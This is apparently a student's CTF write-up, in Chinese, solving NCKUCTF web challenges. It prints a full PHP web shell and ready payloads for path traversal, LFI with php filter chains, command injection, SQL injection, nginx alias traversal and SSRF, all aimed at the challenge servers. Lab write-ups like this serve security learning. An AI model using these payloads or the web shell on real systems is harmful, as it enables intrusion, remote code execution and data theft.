# Robots

連到robots.txt之後可以看到這個

```
User-agent: *
Disallow: /hdw7vtg6cnbKJH/panel.php
```
連進去!

看到蚊子在飛，ctrl+U直接看flag
![image](https://hackmd.io/_uploads/B1yTULvdxx.png)

# gitleak

可以用[這個](https://github.com/internetwache/GitTools.git)把原始碼leak出來

```bash=
┌──(henry㉿LAPTOP-KH7U4LUG)-[~/GitTools/Dumper]
└─$ ./gitdumper.sh https://chall.nckuctf.org:28104/.git/ ai一個3
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ai一個3/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/1e/519b45e60e58401db156e622bbc4cf3b779054
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/3e/7f1d77947c6210a14c7cc830ea14216e2be572
[+] Downloaded: objects/58/ea103a35ef7f2530c65c3361a3401a89fa001f
[+] Downloaded: objects/91/5e77f2a4fb5621224b7fcd6c59156299a0cd50

┌──(henry㉿LAPTOP-KH7U4LUG)-[~/GitTools/Dumper]
└─$
```

阿怎麼ls只有.git?

看一下git log 

```bash
┌──(henry㉿LAPTOP-KH7U4LUG)-[~/GitTools/Dumper/ai一個3]
└─$ git log --all -- .env
commit 1e519b45e60e58401db156e622bbc4cf3b779054 (HEAD -> master)
Author: Vincent55 <5020559@gmail.com>
Date:   Mon Nov 13 17:14:04 2023 +0800

    first

┌──(henry㉿LAPTOP-KH7U4LUG)-[~/GitTools/Dumper/ai一個3]
└─$ 
```

看到commitㄌ

現身吧flag!

```bash=
┌──(henry㉿LAPTOP-KH7U4LUG)-[~/GitTools/Dumper/ai一個3]
└─$ git show 1e519b45e60e58401db156e622bbc4cf3b779054:.env
FLAG=NCKUCTF{D0N7_3XP053_Y0Ur_git_F01D3r}

┌──(henry㉿LAPTOP-KH7U4LUG)-[~/GitTools/Dumper/ai一個3]
└─$
```

# phpisnice

![image](https://hackmd.io/_uploads/Bk469UP_ex.png)

[非常好](https://github.com/JohnHammond/ctf-katana?tab=readme-ov-file#php)

![image](https://hackmd.io/_uploads/ryI09UP_gx.png)

# phpisbest

用陣列讓他們null=null就好了

payload=`https://chall.nckuctf.org:28106/?A[]=[1]&B[]=[0]`

![image](https://hackmd.io/_uploads/HkM16IvOxe.png)

# uploader

上網找Reverse Shell Generator然後就有shell可以複製了

payload

```php=
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

![image](https://hackmd.io/_uploads/Hy79pIw_gl.png)

# Uploader waf

擋了兩個東西:
```
if ($_FILES['file']['type'] === "image/png"){
if ($extension !== "php" ){
```

第一個開burp改content type

第二個老梗改大小寫

burp攔到之後更改一下資訊

![image](https://hackmd.io/_uploads/BywdCIvOex.png)

((是說為什麼檔案名稱沒改

然後就連進去webshell get flag :3 

![image](https://hackmd.io/_uploads/S1Bs08Pdlg.png)

# Pathwalker

到Cappo的時候會看到hint:/var/www/html/flag.php

然後看到url切換目錄的方式就塞塞看點點斜

`https://chall.nckuctf.org:28109/?page=../../../../../../var/www/html/flag.php`

阿跳錯了 原來他會幫我加php

`https://chall.nckuctf.org:28109/?page=../../../../../../var/www/html/flag`

![image](https://hackmd.io/_uploads/SJzXJwDOeg.png)

# pathwalker-waf

一樣 到cappo的時候會有hint

```php
$pattern_file = "/^(apple|banana|cappo)/";
        if (preg_match($pattern_file, $lowercaseComponent)) {
          echo file_get_contents("./page/".$lowercaseComponent.".php");
```

正則表達式翻譯就是路徑必須要包含那三個字串 然後會幫你加上.php

`https://chall.nckuctf.org:28110/?page=cappo/../../../../../../../../../../../../../var/www/html/flag`

![image](https://hackmd.io/_uploads/ryxg2ywv_el.png)

# pathwalker-waf2

這個喔潤局上課有講過

```php=
$safe_path = str_replace('../', '', $_GET['page']);
echo file_get_contents("./page/".$safe_path.".php");
```

`https://chall.nckuctf.org:28142/?page=....//....//....//....//....//....//....//....//....//....//var/www/html/flag`

![image](https://hackmd.io/_uploads/HyAGlwPOgl.png)

# 🍪 Cookie Image

表面上看不出有什麼洞

但是把焦點放到conf檔上

```
events {}

http {
    server {
        listen 80;
        root /app;

        location /static {
            alias /app/static/;
        }

        location = /flag.txt {
            deny all;
        }
    }
}
```

去查一下alias是甚麼
然後查到[這篇文章](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)


參照漏洞利用方式構造payload
`https://chall.nckuctf.org:28143/static../flag.txt`

![image](https://hackmd.io/_uploads/rJVGmPP_xx.png)

# LFI

payload:`https://chall.nckuctf.org:28111/?page=./../../../../../../var/www/html/flag`

![image](https://hackmd.io/_uploads/H1TNrPvuel.png)

有可能是被註解掉了 拿php filter戳看看

payload:`https://chall.nckuctf.org:28111/?page=php://filter/convert.base64-encode/resource=../../../../../../var/www/html/flag`

```bash=
┌──(henry㉿LAPTOP-KH7U4LUG)-[~]
└─$ base64 -d "PD9waHAKICAvL05DS1VDVEZ7MWYxXzE1XzdoM185MDBkX2NoNG5jM30KICBlY2hvICJub2ZsYWcgaGVyZSBRUVxuIjsKICBleGl0KCk7ID8+"
base64: PD9waHAKICAvL05DS1VDVEZ7MWYxXzE1XzdoM185MDBkX2NoNG5jM30KICBlY2hvICJub2ZsYWcgaGVyZSBRUVxuIjsKICBleGl0KCk7ID8+: No such file or directory

┌──(henry㉿LAPTOP-KH7U4LUG)-[~]
└─$ echo "PD9waHAKICAvL05DS1VDVEZ7MWYxXzE1XzdoM185MDBkX2NoNG5jM30KICBlY2hvICJub2ZsYWcgaGVyZSBRUVxuIjsKICBleGl0KCk7ID8+" | base64 -d
<?php
  //NCKUCTF{1f1_15_7h3_900d_ch4nc3}
  echo "noflag here QQ\n";
  exit(); ?>
┌──(henry㉿LAPTOP-KH7U4LUG)-[~]
└─$
```

# lfi2rce

直接貼上好用payload

![image](https://hackmd.io/_uploads/SJFzIwD_gx.png)

```
LFI worldend
bin boot dev etc flag_23fb1b3 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

```bsah=
┌──(henry㉿LAPTOP-KH7U4LUG)-[~/php_filter_chain_generator]
└─$ python3 php_filter_chain_generator.py --chain "<?php system('cat /flag_23fb1b3'); ?>"
```

![image](https://hackmd.io/_uploads/SkWUUDv_ge.png)

# swirl

## stage1

上面解過 payload不變`https://chall.nckuctf.org:28128/stage1.php?A[]=[1]&B[]=[3]`

![image](https://hackmd.io/_uploads/BkCevvvdll.png)

## stage2

什麼意思我payload沒變耶`https://chall.nckuctf.org:28128/stage2_212ad0bdc4777028af057616450f6654.php?A[]=[3]&B[]=[1]`

![image](https://hackmd.io/_uploads/S1tlYwDdlx.png)

## stage3

```       
$path = str_replace("..\\", "../", $path);
$path = str_replace("..", ".", $path);
```

所以我們如果要到處走的話就要繞過這個東西 先不管上面的正則表達式

首先如果我輸入..\ 他會變成../
然後../又會變成./

而正常的path traversal的payload是../

所以我需要的是...\

得出payload`?page=...\config.php`

結果沒東西 按一下Ctrl+U就可以看到隱藏資訊

![image](https://hackmd.io/_uploads/BJ9rjvPdee.png)

就可以進到stage4

# stage4 

要post眼睛
```
<?php
echo '<h1>👻 Stage 4 / 4</h1>';

highlight_file(__FILE__);
echo '<hr>';
extract($_POST);

if (isset($👀)) 
    include($👀);
else die('ERROR: 👀 should be given');
```

掏出php filter chain 直接RCE

payload有點長 如下

![image](https://hackmd.io/_uploads/rJkkZqwdlg.png)

最後cat flag

![image](https://hackmd.io/_uploads/S1bSW9wdxg.png)

`NCKUCTF{y0u_4r3_1n_7h3_php_5w1rl}`

# dig

沒任何黑名單 普通的command injection

payload:`';ls /'`

![image](https://hackmd.io/_uploads/ryhKJBOdxx.png)

然後就可以cat flag
![image](https://hackmd.io/_uploads/rJp31B_ull.png)

# dig-waf1

多ㄌ黑名單 讓我們用code substitution來繞過

![image](https://hackmd.io/_uploads/SJzzVSd_el.png)

# dig-waf2

黑名單 一樣code substitution+${IFS}

繞過

![image](https://hackmd.io/_uploads/HJDIESuugl.png)

# login

輸入密碼的時候會被base64

所以username這邊就得截斷了

payload:`' or 1=1) --`
密碼亂打
簡單sqli

![image](https://hackmd.io/_uploads/Hk38PHu_gl.png)

# sqli unoin

打開source code 

```
<?php
include 'config.php';

if (isset($_GET['sauce'])) {
  show_source(__FILE__);
  die();
}

$id = $_GET['id'] ?? 1;
$query = "SELECT * FROM posts WHERE id = $id";
$stmt = $pdo->query($query);
$post = $stmt->fetch(PDO::FETCH_ASSOC);
?>

<!DOCTYPE html>
<html>
<head>
    <title>SQLi Demo - <?php echo $post['title']; ?></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="container mt-5">
    <h1><?php echo $post['title']; ?></h1>
    <hr>
    <p><?php echo nl2br($post['content']); ?></p>
    <a class="btn btn-secondary" href="/?sauce=true">Source Code</a>
</body>
</html>
```

看到id可以sqli

先UNION SELECT試表格

payload:`?id=1%20UNION%20SELECT%201,2,3;--`時正常顯示

所以根據題目的提示我們可以構造這個payload:`https://chall.nckuctf.org:28303/?id=-1%20UNION%20SELECT%201,flag_value,3%20FROM%20flags;--`

阿flag_value是我一個一個試欄位試出來的

得flag

![image](https://hackmd.io/_uploads/HypKuH__lx.png)

# SSRF2

打開main.py 看到白名單只能用httpbin.dev

```
from flask import Flask, request, render_template, abort, send_file
from urllib.parse import urlparse
from config import flag
import requests

app = Flask(__name__)


@app.route("/mkreq", methods=["GET"])
def make_request():
    url = request.args.get("url")
    if not urlparse(url).hostname.startswith("httpbin.dev"):
        return "badhacker"
    return requests.get(url, verify=False, timeout=2).text


@app.route("/internal-only")
def internal_only():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    return flag


@app.route("/")
def home():
    if request.args.get("debug"):
        return send_file(__name__ + ".py")
    return render_template("index.html")


if __name__ == "__main__":
    app.run(host="0.0.0.0")

```

連進去看一下它的成份

![image](https://hackmd.io/_uploads/Bk41tB_Ogl.png)

發現他可以重新導向

那我們就讓他重新導向到自己吧

payload:`https://httpbin.dev/redirect-to?url=http://localhost/internal-only`

出flag~

![image](https://hackmd.io/_uploads/rJqIFHdOlg.png)
